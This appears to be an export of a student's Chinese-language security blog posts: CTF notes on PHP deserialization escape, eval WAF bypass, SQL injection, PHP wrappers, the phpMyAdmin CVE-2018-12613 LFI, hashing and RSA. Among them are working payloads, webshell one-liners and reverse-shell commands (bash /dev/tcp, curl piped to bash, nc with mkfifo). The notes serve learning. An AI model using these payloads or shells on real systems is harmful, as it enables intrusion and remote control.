在反序列化之前，我把最后一个字符串加了一个d 但是前面的长度还是5没有变，所以反序列化失败了，报错。还有一种情况：通过自己构造的反序列化对象，可以修改对象的某些属性。比如之前c的最后一个字符串为234，我们构造$c1=’a:3:{i:0;s:3:”123”;i:1;s:3:”abc”;i:2;s:5:”wdnmd”;}”;i:2;s:3:”234”;}’;就把最后一个属性的值换成了wdnmd，后面原来的字符串会被忽略。起到了夹带私货的作用。 这道题我们想让photo的值为config.php,所以需要利用上面说的字符串逃逸的问题，将payload挤到后面去。具体什么意思？对nickname的内容进行构造，我们知道，序列化之后长度固定不变。就是S:后面的数字。但是问题就出现在他存在一个字符串替换，把where替换成hacker，使得字符串长度+1。那么问题来了，如何利用？首先绕过正则表达式对nickename的判断，用数组就好。nickname[]我们想传入的字符串为 “;}s:5:”photo”;s:10:”config.php”;} 总长度为34，所以我们需要写34个where加上我们想传入的字符串作为payload，总长度为204（包括34个where和想传入的字符串）在经过序列化，过滤的过程中，所有的where被替换成和hacker，这样序列化后的s:204不变，nickname的值变成了34个hacker，并且成功的修改了photo的值为config.phppayload:wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}注意：任何不正确的反序列化是会失败的。In the end:php unserialize的问题有很多，我只是学习到了其中的一个，等学习到了其他的问题继续整理、巩固下来。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"关于apache与php的理解","slug":"关于apache与php的理解","date":"2020-04-13T15:55:18.000Z","updated":"2020-04-14T14:09:58.000Z","comments":true,"path":"2020/04/13/关于apache与php的理解/","link":"","permalink":"https://polosec.github.io/2020/04/13/%E5%85%B3%E4%BA%8Eapache%E4%B8%8Ephp%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"apache与php当客户端请求www.test.com/1.php的时候，apache监听80端口，收到客户端的请求后发现是PHP文件，将该文件先给PHP解释，解释完之后渲染成html给apache服务器，apache再返回给客户端。 vhost与hosts文件hosts文件在本机代表本机dns 格式 IP DOMAIN，位置/Windows/system32/drivers/etc/hosts文件在本机代表本机dnsvhost文件代表了apache配置的虚拟网站。即同一主机的多个网站，需要配置根目录，域名，端口等信息。 1234567891011121314151617181920212223242526272829&lt;VirtualHost *:80&gt; DocumentRoot &quot;E:/phpstudy_pro/WWW/dura.box&quot; ServerName dora.box ServerAlias FcgidInitialEnv PHPRC &quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts&quot; AddHandler fcgid-script .php FcgidWrapper &quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot; .php &lt;Directory &quot;E:/phpstudy_pro/WWW/dura.box&quot;&gt; Options FollowSymLinks ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted DirectoryIndex index.php index.html error/index.html &lt;/Directory&gt; ErrorDocument 400 /error/400.html ErrorDocument 403 /error/403.html ErrorDocument 404 /error/404.html ErrorDocument 500 /error/500.html ErrorDocument 501 /error/501.html ErrorDocument 502 /error/502.html ErrorDocument 503 /error/503.html ErrorDocument 504 /error/504.html ErrorDocument 505 /error/505.html ErrorDocument 506 /error/506.html ErrorDocument 507 /error/507.html ErrorDocument 510 /error/510.html&lt;/VirtualHost&gt; 这里的域名dura.box其实我并没有注册，我这样写只是为了便捷访问。修改本地dns文件，添加记录 127.0.0.1 dura.box 然后cmd ipconfig/flushdns刷新本地dns缓存重启apache服务，下次访问dura.box的时候就相当于访问根目录为E:/phpstudy_pro/WWW/dura.box/的网站。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"20200410学习笔记","slug":"20200410学习笔记","date":"2020-04-10T12:30:38.000Z","updated":"2020-04-14T11:18:07.000Z","comments":true,"path":"2020/04/10/20200410学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/10/20200410%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天睡了12个小时。。离谱儿。整理一下这两天做的题以及学的内容吧 我这两天睡得这么久是真离谱！！ php strstr()strstr(str1,str2)返回从str2第一次出现开始之后的内容（包括str2)比如 strstr(“phpinput”,”in”)– input php字符串解析bypass前天做了个php字符串解析的问题（buuoj 123456789101112131415&lt;?php error_reporting(0); if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__); &#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;); &#125; ?&gt; 直接传num=phpinfo()的话是不行的，有waf。waf的规则如果是规定num只能是数字的话，给num传个字母就白给了。这里就用到了php字符串解析漏洞了。参考链接https://www.freebuf.com/articles/web/213359.html传一个?%20num=phpinfo()的话，waf找不到num这个参数，而php还是可以把%20num识别成num的。所以可以顺利的到eval那。payload: ?%20num=var_dump(scandir(chr(47))) //chr47是/ 代表根目录 找到flag文件 然后file_get_contents(dir+filename)进行读取即可。这里过滤了/，所以用chr(47)代替 mysql if()IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。比如 if(2&gt;1,1,0) mysql 注释#或者– 如果使用–的话后面需要一个间隔符 否则的话会被识别为+号。比如–+ （在url中 +是空格的url编码） sql注入整型、字符型判断参考链接：https://www.cnblogs.com/puhk/p/12674740.html举例:http://xxx/xxx/Less-1/?id=1 and 1=1 –+输入?id=1 and 1=1 –+正常，输入?id=1 and 1=2 –+报错，可判断为整型注入。http://xxx.xxx/Less-1/?id=1&#39;输入?id=1’出现报错,输入?id=1’’正常，可判断为字符型注入。http://xxx.xxx/Less-1/?id=1&#39; and 1=1 – -输入?id=1’ and 1=1 – -正常，输入?id=1’ and 1=2 – -报错，可判断为字符型注入。 mysql盲注初步参考链接 https://www.anquanke.com/post/id/170626盲注分为基于时间的盲注和基于bool的盲注。基于时间的盲注就是根据判断条件返回是true还是false 进行能够判断的操作（比如sleep） 可以理解为一种fuzz。if(substr(database(),1,1)==97,sleep(1),0) 可以写脚本跑出来数据库的名字等等布尔盲注是根据结果返回值（对应true false ）判断需要找的字段 然后进行爆破","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"}]},{"title":"20200408学习笔记","slug":"20200408学习笔记","date":"2020-04-08T15:24:16.000Z","updated":"2020-04-10T15:12:07.000Z","comments":true,"path":"2020/04/08/20200408学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/08/20200408%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天本来想晚上整理php伪协议的 但是早晨起晚了。。下午起晚了。。晚上弄实验报告的环境弄了一晚上。。太离谱了，明天再详细的写伪协议吧。我今天也起晚了！！废话少说 开始今天的php伪协议总结 参考链接https://www.jianshu.com/p/0a8339fcc269 php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取源代码并进行base64编码输出。eg：php://filter/convert.base64-encode/resource=xxx.phpphp://input: 获取post datafile://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。eg：file:///etc/passwdphar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.phpdata://：需满足allow_url_fopen，allow_url_include同时开启才能使用，使用如下：data://很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入file.php?file=data://text/plain,file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"20200406学习笔记","slug":"20200406学习笔记","date":"2020-04-06T14:37:21.000Z","updated":"2020-04-06T16:21:13.000Z","comments":true,"path":"2020/04/06/20200406学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/06/20200406%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天又睡了老久。。晚上整理一下其实今天整理这个一方面是不会，另一方面是看到心仪大学夏令营面试有问过这个问题（生日攻击），或许可能不会再问了，但知道总比不知道强！一下内容除webshell和php外皆为生日攻击衍生出来的问题（对我来说没掌握的）今日内容：MD5碰撞√，生日攻击√，哈希√，彩虹表√，盐√，webshell本质，php某方法√，幻数√，内存存储方式√参考：https://www.zhihu.com/question/20820286https://zhuanlan.zhihu.com/p/37165658https://blog.csdn.net/M_mamba/article/details/103405022https://zhuanlan.zhihu.com/p/43994479https://www.jianshu.com/p/732d9d960411https://blog.csdn.net/blade2001/article/details/6341078 hash哈希算法也成为散列算法，可以通过哈希算法单向求得某值。理想情况下，可以正向快速求得该值，并且不能通过该值还原出原数据；原数据即使变化很小，得到的数据变化也比较大。哈希算法可用来验证传输过程中数据是否被篡改。hash算法不理想的情况：存在冲突。即多个原始数据对应一个目标值：h(a)=h(b)=k。在数学上函数必然可逆，且hash函数值域有限，比如128bitMD5的值域为2128=1632(第一次我竟然算错了2333 ,2exp28和32exp16怎么也对不上。我太菜了)哈希算法常见的有：MD5 SHA-1(Secure Hash Algorithm,SHA) SHA-2* SHA512。目前MD5,SHA-1已经不安全。这样可能会导致一些问题，比如在分发session的时候如果用hash计算，如果两用户session值相同的话，会导致越权操作。MD5的长度为128bit，sha1长度为160bit，sha256为256bit,sha512为512bit。 hash冲突处理方法MD5算出来啥就是啥，不知道是不是冲突，此处讨论的冲突是存放的时候的冲突处理！ 开放定址法线性探测法线性补偿探测法线性随机法拉链法多次hash设立公共溢出区幻数与内存存储方式其实内存存储方式是大一学的。。还是比较感谢王老师。。虽然老念ppt，但是问问题还是很热心的帮我解决。谢谢谢谢幻数就是常用的数。MD5的四个幻数ABCD分别是（hex）：A: 01 23 45 67B: 89 ab cd efC: fe dc ba 98D: 76 54 32 10计算机硬件有两种储存数据的方式：大端字节序（big endian）和小端字节序（little endian）。大端字节序：高位字节在前，低位字节在后，这是人类读写数值的方法。小端字节序：低位字节在前，高位字节在后，即以0x1122形式储存。比如用大端字节序存0x01234567的话就是 01 23 45 67小端的话就是 67 45 23 01 生日攻击&amp;&amp;彩虹表&amp;&amp;salt生日问题：一个班级需要有多少人，才能保证每个同学的生日都不一样？答案很出人意料。如果至少两个同学生日相同的概率不超过5%，那么这个班只能有7个人。事实上，一个23人的班级有50%的概率，至少两个同学生日相同；50人班级有97%的概率，70人的班级则是99.9%的概率。由该问题引出的是取值空间与计算哈希值次数和碰撞概率的关系。数学推导我这就不写了。我数学比较菜，当时看了一会才看懂咋回事。。对不起孙老师取值空间为365，70个人中至少两人生日重复的概率为99%。365就是取值空间，70就是哈希计算次数。由生日攻击与哈希碰撞导出的问题是破解哈希值以及如何防御哈希破解。 哈希值破解由于哈希函数是单向的，所以破解方式照理来说应该是暴力破解或者手动算字典的哈希值，建立一个一一对应的关系然后查表。对应方法：1.暴力破解2.字典3.彩虹表这里重点说一下彩虹表，彩虹表并不是单纯的原文-密文一一对应的形式。彩虹表前身–散列链设加密函数为H(X)，则散列链存在一个约简函数R(X)，其定义域和值域与H(X)相反。对于散列链和彩虹表详细的计算过程我还没看太明白，请教完老师再来写。现在已知的是彩虹表是一种中和的方式来破解哈希值。当k越大时，破解时间就越长，但彩虹表所占用的空间就越小；相反，k越小时，彩虹表本身就越大，相应的破解时间就越短。 加salt抵抗彩虹表salt可以是一串随机数。假设原文是abc，不加salt加密后的数据为 DEF，加salt加密后的数据为GKD彩虹表还原出DEF的概率相对加salt后的概率相对大一些。因为对GKD还原后的数据大概率就不是原数据abc了。应用场景：用户注册时：hash(password+salt)-&gt;DB,salt-&gt;DB用户登录时 if(hash_in_db==hash(input_username+salt)) return true; php file_get_contents()file_get_contents()方法把整个文件读入到字符串中。 webshellwebshell是什么，shell是什么？shell是用户与操作系统交互的工具、平台。webshell就是基于web的shell，可以用于网站管理等功能。常见的webshell就是命令执行，比如php的 将这句话写入以PHP为后端的网站后，通过对该文件传参数www.tst.com/1.php?cmd=whoami相当于在shell中执行whoami。当然，也可以用一些webshell管理工具方便操作，比如菜刀，蚁剑。asp一句话： &lt;%eval request(“x”)%&gt; &lt;%execute request(“MH”)%&gt;jsp一句话：&lt;% Runtime.getRuntime().exec(request.getParameter(“shell”)); %&gt;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"密码学","slug":"密码学","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"20200404学习笔记","slug":"20200404学习笔记","date":"2020-04-04T14:17:15.000Z","updated":"2020-04-07T09:00:33.000Z","comments":true,"path":"2020/04/04/20200404学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/04/20200404%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"缅怀先烈，吾辈当自强。CVE-2018-12613 phpmyadmin LFI &amp;&amp;buuoj ezweb : )参考链接：https://www.freebuf.com/vuls/176064.html首先分析index.php:在index.php 第56行， 传入的target参数需要满足四个条件：1.是字符串2.不能以index开头3.不在黑名单内4.通过checkPageValidity函数检验，即返回true跟进checkPageValidity函数 1234567891011121314151617181920212223242526272829303132333435public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; 函数分析：如果传入的白名单为空的话，就去找goto_whitelist。如果没有设置page或者page变量不是字符串 返回false。如果page在白名单内，返回true mb_strpos($page . ‘?’, ‘?’)获得page变量?前的长度 注意：’.’用来连接两个字符串 mb_substr 获得[start,end)长度的字符串。 举例如下： 继续分析。 来到 123456789$_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; 将?两次urlencode编码后为%253f。进入php后会自动解码一次，变成%3f，然后再次解码，成功绕过检验。（不双重编码无法绕过的原因为:如果直接给一个?的话,在第一个截取验证中，php会把问号后面的东西当作参数，include的还是db_sql.php。） 所以index.php中的INCLUDE变成了： include db_sql.php%3f(由于php会把db_sql.php%3f当成目录，所以需要多加一个../来跨目录。） payload:http://192.168.0.106:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"}]},{"title":"20200402学习笔记","slug":"20200402学习笔记","date":"2020-04-02T04:14:20.000Z","updated":"2020-04-03T14:01:37.000Z","comments":true,"path":"2020/04/02/20200402学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/02/20200402%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"动态规划今天下午做了一个动态规划的题 还没大弄明白，捞的不谈。等我下次看到这or 学习一段时间动态规划后再去做。 buuctf今天做了一道ciscn 2019的题。很惭愧。这道题是华东北赛区分区赛的一道web题，当时我没做出来，只做到了如何破解md5前六位的一步，而且是用别人写的脚本跑的。当时没做xss的部分，首先是过滤的问题，过滤的字符太多，当时没有想到怎么绕过，就没有继续做了….我太菜了。今天在此整理一下该题的解题思路。首先写一段xss代码，提交后把链接放到问题反馈那，用脚本跑一下md5前6位。这一步完成后会有一个bot模拟管理员，管理员访问后通过xss发送管理员的身份信息到接收平台。从接收平台获取到session后，使用管理员登录。扫描后台发现admin.phpPHPSESSID修改后登录即可首先用group by 判断列数，然后找一下数据库名 -1 and 1=2 union select 1,2,database() from information_schema.schemata -&gt;数据库名 ciscn根据数据库名找表（通过limit看有多少表、多少多少字段）-1 union select 1,2,table_name from information_schema.tables where table_schema=’ciscn’ -》找到表flag 然后limit 找其他的表，这里其他的表没啥用根据表名找列-1 union select 1,2,column_name from information_schema.columns where table_name =’flag’ -》找到列 flagg根据列名查数据 -1 union select 1,2,flagg from flag 找到flag。getflag。彳亍。。就看看user表有啥把-1 union select 1,2,table_name from information_schema.tables where table_schema=’ciscn’ limit 1,1 找到users表-1 union select 1,2,column_name from information_schema.columns where table_name=’users’ 找到USER字段 limit 1,1 找到CURRENT_CONNECTIONS，username，password字段-1 union select 1,username,password from users limit 这句话应该就对应着这个查询框 select username,password from users where id=?这道题就结束了。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"20200331学习笔记","slug":"20200331学习笔记","date":"2020-03-31T14:04:55.000Z","updated":"2020-03-31T14:37:53.000Z","comments":true,"path":"2020/03/31/20200331学习笔记/","link":"","permalink":"https://polosec.github.io/2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"浮生日记2020.3.31 晴今天又是菜鸡的一天，刷题入门题就不会，心态崩了dp，一定拿下！ c语言相关参考链接：https://blog.csdn.net/danxibaoxxx/article/details/81236180https://blog.csdn.net/CV_Jason/article/details/85244813https://blog.csdn.net/bestkilly/article/details/80659109?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-taskhttps://blog.csdn.net/abaloon/article/details/8173552https://blog.csdn.net/ai_yue/article/details/82777806?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task ld&amp;lf这涉及到了c语言的精度问题。首先看常见数据类型的取值范围：char -128 ~ +127 (1 Byte)short -32767 ~ + 32768 (2 Bytes)unsigned short 0 ~ 65536 (2 Bytes)int -2147483648 ~ +2147483647 (4 Bytes)unsigned int 0 ~ 4294967295 (4 Bytes)long == intlong long -9223372036854775808 ~ +9223372036854775807 (8 Bytes)double 1.7 * 10^308 (8 Bytes)unsigned int 0～4294967295long long的最大值：9223372036854775807long long的最小值：-9223372036854775808unsigned long long的最大值：1844674407370955161__int64的最大值：9223372036854775807__int64的最小值：-9223372036854775808unsigned __int64的最大值：18446744073709551615结论：输入输出long long/double的时候需要用%ld/%lf 存储形式存储形式参考第三个链接，需要注意的是阶码是怎么得来的，我一开始也想错了。 补码表示范围为什么八位二进制补码的表示范围是-128 — +127？首先明确第一位是符号位。以下为原码表示：正数： +0—+12700000000—01111111负数：-0 —- -12710000000 —- 11111111 无符号数10000000代表128，在补码中本来应该是-0，由于一个数对应一个补码，所以-0的补码用来表示-128。这也解释了为什么8位二进制数可表示的范围是-128~127。","categories":[],"tags":[{"name":"c语言","slug":"c语言","permalink":"https://polosec.github.io/tags/c%E8%AF%AD%E8%A8%80/"}]},{"title":"linux&shell&反弹shell&环境变量","slug":"linux-shell-反弹shell","date":"2020-03-30T02:25:51.000Z","updated":"2020-03-30T09:11:33.000Z","comments":true,"path":"2020/03/30/linux-shell-反弹shell/","link":"","permalink":"https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"近期学习了许多关于Linux的基础知识，也从侧面反映出了我上课所学的基础知识没有多加练习，忘了不少。本文学习路线：首先是在CTF比赛中遇到了需要反弹shell的问题，采用常用反弹shell的方式无法反弹，于是学习了用curl反弹shell等多种反弹shell的方式；探究反弹shell的本质，学习到了&lt;与&gt;以及输入输出重定向；跑脚本的时候太麻烦，需要切换到脚本目录，于是学习了如何添加环境变量以及如何用alias。 预备知识linux shell、反弹shell、重定向、环境变量 参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）https://xz.aliyun.com/t/2548https://xz.aliyun.com/t/2549http://www.linuxso.com/command/alias.htmlhttps://blog.csdn.net/revilwang/article/details/8374362https://blog.csdn.net/flw8840488/article/details/90513873https://blog.csdn.net/lw305080/article/details/52054188https://www.runoob.com/linux/linux-system-contents.html shell如何理解shell？shell是用户与Linux内核之间的一层“代理”，用户通过shell与Linux内核建立联系。shell是在内核基础上编写的应用程序。当然，shell也支持编程，这里不展开讲解。 反弹shell先说怎么反弹shell，再说反弹shell的原理。首先攻击机上执行 nc -lvp 8888 bash反弹bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 curl反弹首先在公网vps 写好反弹shell的语句 保存到ip/bashRCE: curl ip/bash |bash // |是管道符，意思是将上一个的输出作为下一个的输入 nc反弹受害机执行 nc -e /bin/sh ip port如果nc版本不对的话可以这样：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f execexec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done 理解反弹shell 第一句：bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1理解：将交互式bash的输出与错误输出重定向到/dev/tcp/ip/port 文件，并且将标准输入重定向到标准输出。前面的&amp;&gt;代表将输出与错误输出都重定向到后面的文件，后面的0&amp;&gt;1代表将标准输入（文件操作符0）重定向到标准输出（文件操作符1）。注意，这里的&amp;代表了识别后面的1为文件操作符（代表标准输出），而不是“1”这个文件。Linux操作系统把所有内容都抽象为文件，包括tcp连接。示意图虚线表示了stdin 重定向到stdout，由于stdout已经重定向到了/dev/tcp/ip/port ，所以stdin也将重定向到/dev/tcp/ip/port。 第二句 RCE: curl ip/bash |bash // |是管道符，意思是将上一个的输出作为下一个的输入首先在公网vps上写一个文件，内容为bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 重命名为bash然后再受害机上执行curl ip/bash | bash 意思就是说通过curl获取bash的html内容，并且作为下一个的输入。bash是Linux中的shell，用于用户和内核交互。相当于用户输入了bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 第三句 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f相当于创建了一个管道/tmp/f ，错误输出重定向到标准输出，标准输出重定向到/tmp/f ,把cat /tmp/f的结果传给交互式shell执行，传给nc ip port。形成环路。大佬解读：mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路我的解读：其实后半段的意思就是把传进来的命令用/bash/sh 执行，然后把结果传给ip port,然后 ip port 发送的结果传给/tmp/f,然后cat tmp /f,然后shell执行….就这么套娃，交互式shell就成了。环境变量环境变量文件： /etc/profile 全局用户，应用于所有的Shell。 /$HOME/.profile 当前用户，应用于所有的Shell。 /etc/bash_bashrc 全局用户，应用于Bash Shell。 ~/.bashrc 局部当前，应用于Bash Sell。写入/etc/profile文件export $PATH:/dir/subdir环境变量解析过程系统环境变量/etc/profile: 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,并从/etc/profile.d目录的配置文件中搜集shell的设置./etc/bashrc: 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取.用户环境变量.bash_profile ：定义了用户的个人化路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次。（在这个文件中有执行.bashrc的脚本）.bashrc ：该文件包含专用于你的shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。例如你可以将用户自定义的alias或者自定义变量写到这个文件中。.bash_history ：记录命令历史用的。.bash_logout ：当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。用户切换与环境变量大部分Linux发行版的默认账户是普通账户，而更改系统文件或者执行某些命令，需要root身份才能进行，这就需要从当前用户切换到root用户，Linux中切换用户的命令是su或su -前者只是切换root身份，但shell环境仍然是普通用户的shell；而后者连用户和shell环境一起切换成root身份了。只有切换了shell环境才不会出现PATH环境变量错误。su切换成root用户以后，pwd一下，发现工作目录仍然是普通用户的工作目录；而用su - 命令切换以后，工作目录变成root工作目录了。Linux文件目录 /bin：bin是Binary的缩写, 这个目录存放着最经常使用的命令。 /boot：这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ：dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media：linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。 /mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。 /opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc：这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： /root：该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin：s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。 /selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 /srv： 该目录存放一些服务启动之后需要提取的数据。 /sys： 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。 sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。该文件系统是内核设备树的一个直观反映。 当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp：这个目录是用来存放一些临时文件的。 /usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin：系统用户使用的应用程序。 /usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src：内核源代码默认的放置目录。 /var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"}]},{"title":"RSA Encryption","slug":"RSA-AES-Encryption","date":"2020-03-27T03:18:31.000Z","updated":"2020-03-30T02:51:04.000Z","comments":true,"path":"2020/03/27/RSA-AES-Encryption/","link":"","permalink":"https://polosec.github.io/2020/03/27/RSA-AES-Encryption/","excerpt":"","text":"致敬、参考https://blog.csdn.net/dbs1215/article/details/48953589https://www.jianshu.com/p/0f9b72d691c2https://blog.csdn.net/weixin_37490221/article/details/80823129 RSARSA基本概念RSA是一种非对称加密算法。当时学计算机网络的时候对对称、非对称的概念很模糊，总是记不清。前两天SSH登录尝试了RSA免密登录，结合之前问过的老师的相关内容，对RSA的整个过程有了一个大致的了解。私钥一定只有自己知道才能保证安全！！密文=(明文E)mod N明文=(密文D)mod N符号说明：N：由两个质数pq构成。L：1&lt;L&lt;lcm(p-1,q-1) (p-1,q-1的最小公倍数)E：1&lt;E&lt;L &amp;&amp; gcd(E,L)=1D: 1&lt;D&lt;L &amp;&amp; ED mod L=1 (这也印证了对E的定义中为什么E和L要互质) 实现过程取p=17,q=19,则N=323则L=lcm(16,18)=144∵1&lt;E&lt;L &amp;&amp; gcd(E,L)=1∴ E=5由1&lt;D&lt;L &amp;&amp; ED mod L=1可得：7*D MOD 144 =1 -&gt; 5D=145n(n∈N)（这里的N*代表正整数）可得D=29则：公钥对(E,N)=(5,323)私钥对(D,N)=(29,323)设原始消息M=233，经私钥加密后的密文=明文E mod N=275解密过程中，明文=密文D mod N=233，还原成功。 RSA工作过程原始需要发送的消息为m公钥加密方法为pubencode()公钥解密方法为pubdecode()公钥加密/解密得到的内容为pub(m)私钥加密方法为priencode()私钥解密方法为pridecode()私钥加密/解密得到的内容为pri(m)Client————————–transmitting ————ServerM1-&gt;priencode()-&gt;pri(M1)-&gt; ………….. pri(M1)-&gt;pubdecode()-&gt;M1M2&lt;-pridecode()&lt;-pub(M2)&lt;- ………….. pub(M2)&lt;-pubencode()&lt;-M2 